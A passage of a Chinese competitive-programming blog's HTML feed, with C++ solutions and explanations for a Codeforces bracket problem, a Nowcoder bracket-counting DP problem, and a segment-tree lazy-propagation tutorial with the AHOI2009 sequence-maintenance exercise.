class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum1[r<span class="number">-1</span>]-sum1[l<span class="number">-1</span>]);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//l==8 r==7</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum2[r+<span class="number">1</span>]-sum2[l+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Recover-an-RBS"><a href="#C-Recover-an-RBS" class="headerlink" title="C. Recover an RBS"></a>C. Recover an RBS</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是摁贪，从前往后扫一遍计数，当所需的右括号刚好等于问号数量的时候，那就把前面的全部清零，重新计数，看看最后问号数量是否等于左括号的数量即可。那你可能会有疑问，什么时候问号变成左括号呢？问得好，因此我们多出一个，让问号的数量</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)q++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)cnt++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)cnt--;</span><br><span class="line">        <span class="keyword">if</span>(q+cnt==<span class="number">1</span>)&#123;</span><br><span class="line">            q=<span class="number">0</span>;</span><br><span class="line">            cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==q)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了qwq</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>牛客多校(2022-7-23)题解</title>
      <link href="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>牛客多校碰到毒瘤括号dp题，题解记录一下。</p><span id="more"></span><h2 id="K题目描述"><a href="#K题目描述" class="headerlink" title="K题目描述"></a>K题目描述</h2><p><img src="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>给定长度为n的括号序列（不保证合法性），求在此基础上生成的长度为m括号序列的方案数。</p><p>设 $dp[i][j][k]$表示插入括号的数量为 $i$、使用的原来的序列中的括号数量为 $j$，左括号比右括号多 $k$ 时的方案数。那么最终答案为 $dp[m-nl[n][0]$。那么考虑如何设计状态转移：</p><p>首先枚举插入的括号数量，原来的括号序列和左括号比右括号多的数量。<br>如果目前枚举到的括号为左括号，并且使用的原括号的数量$&lt; n$，就可以将该括号放入最终序列中，即为：<br>$$<br>dp[i][j+1][k+1]=(dp[i][j+1][k+1]+dp[i][j][k])%mod<br>$$<br>如果此时枚举到的是一个右括号，并且$k&gt;0$，即左括号的数量大于右括号的数量，并且使用的原括号的数量$&lt;n$，就将该右括号放入最终序列：<br>$$<br>dp[i][j+1][k-1]=(dp[i][j+1][k-1]+dp[i][j][k])%mod<br>$$<br>如果使用的括号数量为 $n$，或当前枚举到右括号，则可以插入左括号：<br>$$<br>dp[i+1][j][k+1]=(dp[i+1][j][k+1]+dp[i][j][k])%mod<br>$$<br>当 $k&gt;0$ 时，如果使用原序列括号的数目为 $n$，或当前枚举到左括号，则可以插入右括号：<br>$$<br>dp[i+1][j][k-1]=(dp[i+1][j][k-1]+dp[i][j][k])%mod<br>$$</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> gcc optimize(2)</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">220</span>][<span class="number">220</span>][<span class="number">220</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//memset(dp, 0, sizeof(dp));</span></span><br><span class="line">    <span class="keyword">int</span> n, m; cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    string s; cin &gt;&gt; s;</span><br><span class="line">    <span class="comment">//if(n &amp; 1 || (m - n) &amp; 1) &#123; cout &lt;&lt; 0 &lt;&lt; endl; return; &#125;</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - m; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; ++j)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n; ++k)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                    dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">cout &lt;&lt; dp[n - m][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n + <span class="number">2</span>; k++) dp[i][j][k] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span>; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--) <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 牛客多校 </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线段树专题训练</title>
      <link href="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/"/>
      <url>/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<p>练一下线段树专题吧，本篇博客持续更新！</p><span id="more"></span><h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p>线段树是算法竞赛中常用的用来维护 <strong>区间信息</strong> 的数据结构。</p><p>线段树可以在 $O(\log N)$ 的时间复杂度内实现单点修改、区间修改、区间查询（区间求和，求区间最大值，求区间最小值）等操作。</p><p>线段树维护的信息在很多时候可以认为是满足（幺）半群的性质的信息。</p><p>一个幺半群 $M=(S,\circ ,e)$，其中 $\circ$ 为在集合 $S$ 上定义的二元运算符，幺半群具有以下性质：</p><ul><li>封闭性：$\forall x\in S$ 和 $\forall y\in S$ 有 $x\circ y\in S$。</li><li>结合律：$\forall x,y,z\in S$ 有 $(x\circ y)\circ z=x\circ (y\circ z)$。</li><li>存在幺元：即 $\exists e\in S$ 满足 $\forall x \in S$ 有 $e\circ x=x$，$e$ 为左幺元；或 $x\circ e=x$，$e$ 为右幺元。</li></ul><p>我们观察到线段树上的信息一般满足这样的性质，一些数域上的加法与乘法自然，考虑二元的 $\max(x,y)$ 运算，此时幺元为 $-\infty$ 也满足这样的性质（一般左右幺元相同时简称为幺元）。</p><p>线段树将每个长度不为 $1$ 的区间划分成左右两个区间递归求解，把整个线段划分为一个树形结构，通过合并左右两区间信息来求得该区间的信息。这种数据结构可以方便的进行大部分的区间操作。</p><p>有个大小为 $5$ 的数组 $a={10,11,12,13,14}$，要将其转化为线段树，有以下做法：设线段树的根节点编号为 $1$，用数组 $d$ 来保存我们的线段树，$d_i$ 用来保存线段树上编号为 $i$ 的节点的值（这里每个节点所维护的值就是这个节点所表示的区间总和）。</p><p>我们先给出这棵线段树的形态，如图所示：</p><p><img src="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/segt1.svg"></p><p>图中每个节点中用红色字体标明的区间，表示该节点管辖的 $a$ 数组上的位置区间。如 $d_1$ 所管辖的区间就是 $[1,5]$（$a_1,a_2, \cdots ,a_5$），即 $d_1$ 所保存的值是 $a_1+a_2+ \cdots +a_5$，$d_1=60$ 表示的是 $a_1+a_2+ \cdots +a_5=60$。</p><p>通过观察不难发现，$d_i$ 的左儿子节点就是 $d_{2\times i}$，$d_i$ 的右儿子节点就是 $d_{2\times i+1}$。如果 $d_i$ 表示的是区间 $[s,t]$（即 $d_i=a_s+a_{s+1}+ \cdots +a_t$) 的话，那么 $d_i$ 的左儿子节点表示的是区间 $[ s, \frac{s+t}{2} ]$，$d_i$ 的右儿子表示的是区间 $[ \frac{s+t}{2} +1,t ]$。</p><p>在实现时，我们考虑递归建树。设当前的根节点为 $p$，如果根节点管辖的区间长度已经是 $1$，则可以直接根据 $a$ 数组上相应位置的值初始化该节点。否则我们将该区间从中点处分割为两个子区间，分别进入左右子节点递归建树，最后合并两个子节点的信息。（以上来自wiki）</p><p>在进行区间操作的时候，我们一般不会把状态更新到每个节点，如果更新，那么一次操作最大的复杂度会是 $O(n)$。因此我们会采取懒惰标记的方式去记录这次的操作，如果这次更新完整地包含了一个区间，那么我们对这个区间打上懒惰标记，不继续往下更新，若要查询，则会将懒惰标记加到对应的节点上去。可以证明，每一次操作不会超过4个区间，加上区间操作是从上往下延的，那么一次操作理论最坏的情况应该是 $O(log_2n)$，非常符合我们的要求。查询复杂度同理，也是 $O(log_2n)$。</p><p>这里需要注意几点：</p><h2 id="懒惰标记怎么打？"><a href="#懒惰标记怎么打？" class="headerlink" title="懒惰标记怎么打？"></a>懒惰标记怎么打？</h2><p>当当前区间完全包含于我要操作的区间，这个时候可能会有点疑问，这个区间的值我是加或者不加，我的懒惰标记肯定会给到这个区间，但是这个值加不加，懒惰标记给到了，那么一个区间带了一个懒惰标记，它的值到底是意味着加了还是没加呢？因为感觉理论上好像都可行的，但是这里实际情况是：要加！因为我区间的值会被更新到父亲节点，如果我不加，那么更新上去的节点值就是错误的。因此此时我一定要把值加上去。那么一个区间带了懒惰标记它的含义是：我自己的值已经加上去了，但是我的儿子区间和孙子，曾孙子区间都没加上这个值，等会过来的时候都需要加上，那么带了懒惰标记的那个区间是已经加上了的。</p><p>所以懒惰标记什么含义一定要搞清楚，不能模棱两可，不能，不能！！！</p><h2 id="什么时候push-down"><a href="#什么时候push-down" class="headerlink" title="什么时候push down"></a>什么时候push down</h2><p>懒惰标记下传的操作我们叫 <code>push_down</code>。什么时候需要呢？我们理解了懒惰标记的含义之后，我们就清楚了，带了懒惰标记的区间，本身已经加上了值，只是儿子都没加上去。那么如果我直接再对整个区间操作，需不需要 <code>push_down</code> 呢？不需要，因为这个区间已经是真实值了，但是我在对一个带有懒惰标记的区间的儿子区间尝试进行操作的时候呢？那肯定需要了！因为儿子区间还不是真实值，还得加上父亲给它的懒惰标记才是。</p><p>那么我们 <code>push_down</code> 一次就会把一个区间的懒惰标记清零，给对应的两个儿子区间加上对应的值，并把懒惰标记分发给他们。</p><h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><h2 id="P2023-AHOI2009-维护序列"><a href="#P2023-AHOI2009-维护序列" class="headerlink" title="P2023 [AHOI2009] 维护序列"></a>P2023 [AHOI2009] 维护序列</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p>老师交给小可可一个维护数列的任务，现在小可可希望你来帮他完成。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>有一个长为 $n$ 的数列 ${a_n}$，有如下三种操作形式：</p><ol><li>格式 <code>1 t g c</code>，表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i\times c$ ;</li><li>格式 <code>2 t g c</code> 表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i+c$ ;</li><li>格式 <code>3 t g</code> 询问所有满足 $t\le i\le g$ 的 $a_i$ 的和，由于答案可能很大，你只需输出这个数模 $p$ 的值。</li></ol><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行两个整数 $n$ 和 $p$。</p><p>第二行含有 $n$ 个非负整数，表示数列 ${a_i}$ 。</p><p>第三行有一个整数 $m$，表示操作总数。</p><p>从第四行开始每行描述一个操作，同一行相邻两数之间用一个空格隔开，每行开头和末尾没有多余空格。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>对每个操作 3，按照它在输入中出现的顺序，依次输出<strong>一行一个整数</strong>表示询问结果。</p><h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h3><h4 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7 43</span><br><span class="line">1 2 3 4 5 6 7</span><br><span class="line">5</span><br><span class="line">1 2 5 5</span><br><span class="line">3 2 4</span><br><span class="line">2 3 7 9</span><br><span class="line">3 1 3</span><br><span class="line">3 4 7</span><br></pre></td></tr></table></figure><h4 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">35</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h4 id="样例输入输出-1-解释"><a href="#样例输入输出-1-解释" class="headerlink" title="样例输入输出 1 解释"></a>样例输入输出 1 解释</h4><ul><li>初始时数列为 ${1,2,3,4,5,6,7}$。</li><li>经过第 $1$ 次操作后，数列为 ${1,10,15,20,25,6,7}$。</li><li>对第 $2$ 次操作，和为 $10+15+20=45$，模 $43$ 的结果是 $2$。</li><li>经过第 $3$ 次操作后，数列为 ${1,10,24,29,34,15,16}$。</li><li>对第 $4$ 次操作，和为 $1+10+24=35$，模 $43$ 的结果是 $35$。</li><li>对第 $5$ 次操作，和为 $29+34+15+16=94$，模 $43$ 的结果是$8$。</li></ul><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>测试数据规模如下表所示：</p><table><thead><tr><th align="center">数据点编号</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9,10</th></tr></thead><tbody><tr><td align="center">$n=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr><tr><td align="center">$m=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr></tbody></table><p>对于全部的测试点，保证 $0 \leq p, a_i, c \leq 10^9$，$1 \leq t \leq g \leq n$。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>是一个线段树的翻版题，只不过要取模，并且有乘法，乘法其实跟加法一样，如果区间里的数都乘上一个数，那么其实就相当于先和再乘，乘法懒惰标记默认应该为1。因为既有加法也有乘法，因此我们需要两个懒惰标记，当懒惰标记乘上去时，加法的懒惰标记应该对应要乘上去，在push_down的时候，我们先乘，再加即可。</p><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,p;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> lazy1;</span><br><span class="line">    <span class="keyword">int</span> lazy2;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    tree[now].lazy1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[r];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    tree[now].sum=(tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_lazy</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> lazy1,<span class="keyword">int</span> lazy2)</span></span>&#123;</span><br><span class="line">    tree[i].sum*=lazy1;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].sum+=(tree[i].r-tree[i].l+<span 